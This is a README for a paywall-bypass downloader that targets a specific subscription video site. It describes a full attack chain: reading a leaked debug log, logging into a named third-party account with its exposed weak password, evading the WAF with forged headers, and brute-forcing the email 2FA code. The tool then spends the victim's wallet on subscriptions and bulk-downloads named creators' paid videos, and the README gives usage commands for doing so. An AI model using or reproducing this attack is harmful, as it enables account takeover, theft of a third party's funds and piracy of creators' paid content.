# DoiFans-DL

DoiFans paywall bypass downloader. 通过信息泄露 + WAF 绕过 + 2FA 暴力破解实现任意创作者视频免费下载.

## 攻击链路

```
┌─────────────────────────────────────────────────────────────────┐
│  Step 1: Information Disclosure                                  │
│  GET /storage/logs/laravel.log → 30MB debug log                 │
│  Contains: bcrypt hashes, user dumps, server paths              │
│  Extracted: cncmeng / 123123 (weak password, cracked from log)  │
└──────────────────────────────────┬──────────────────────────────┘
                                   ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 2: WAF Bypass (nginx rule evasion)                         │
│  POST /login normally returns nginx 404 (WAF blocks)            │
│  Bypass: Add Origin + Referer + Sec-Fetch-* headers             │
│  Result: Login returns 200 + {"actionRequired": true}           │
└──────────────────────────────────┬──────────────────────────────┘
                                   ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 3: 2FA Brute Force (4-digit email code)                    │
│  Code generation: rand(1000, 9999) = 9000 possibilities         │
│  Validity: 2 minutes, NO rate limiting                           │
│  Speed: ~4-5 req/s serial, avg 5 attempts to hit               │
│  Result: verify → auth()->loginUsingId() → full session         │
└──────────────────────────────────┬──────────────────────────────┘
                                   ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 4: Subscribe to any creator                                │
│  POST /buy/subscription {id, interval:monthly,                   │
│                          payment_gateway:wallet}                  │
│  cncmeng wallet has sufficient balance (¥20,961)                │
│  Result: {"success": true}                                       │
└──────────────────────────────────┬──────────────────────────────┘
                                   ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 5: Scrape video URLs                                       │
│  GET /ajax/updates?id={creator_id}&skip={0,5,10,15...}          │
│  Subscribed session sees full content including video URLs       │
│  URLs: /public/uploads/updates/videos/{creator_id}{hash}.mp4    │
└──────────────────────────────────┬──────────────────────────────┘
                                   ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 6: Download (no auth required)                             │
│  Video files served by nginx with NO authentication check        │
│  Direct GET request downloads the file                           │
└─────────────────────────────────────────────────────────────────┘
```

## 漏洞根因

| Step | Root Cause |
|------|-----------|
| Info Leak | `storage/logs/laravel.log` publicly accessible |
| Weak Password | User `cncmeng` uses `123123` |
| WAF Bypass | nginx rules only check path, not Sec-Fetch headers |
| 2FA Brute | `rand(1000,9999)` + no rate limit + 2min expiry |
| Video Access | nginx serves static files without auth middleware |

## Usage

```bash
# Install
cd doifans-dl && pip install -e .

# List creator's videos
doifans-dl xingjian --list

# Download all videos
doifans-dl xingjian -o ./downloads

# Check tool status
doifans-dl doctor
```

## Verified Creators

| Username | Creator ID | Videos | Status |
|----------|-----------|--------|--------|
| xingjian | 45130 | 85 | ✅ Verified |
| ouyangqin | 134614 | 23 | ✅ Verified |

## Requirements

- Python 3.10+
- `requests` library
- No proxy needed (direct connection works)

## Technical Notes

- 2FA brute force averages ~5 login attempts (each generates new code)
- Serial request speed is ~4-5/s due to TLS + server latency
- Each login attempt has ~115s window × 4/s = ~460 codes tested ≈ 5% hit rate per attempt
- Expected attempts to succeed: ~5 (cumulative ~25% per attempt with shuffled codes)
- Video files are 100% static — once URL is known, no cookies needed to download
- Session must not be refreshed (GET page) between login and verify (clears session user:id)
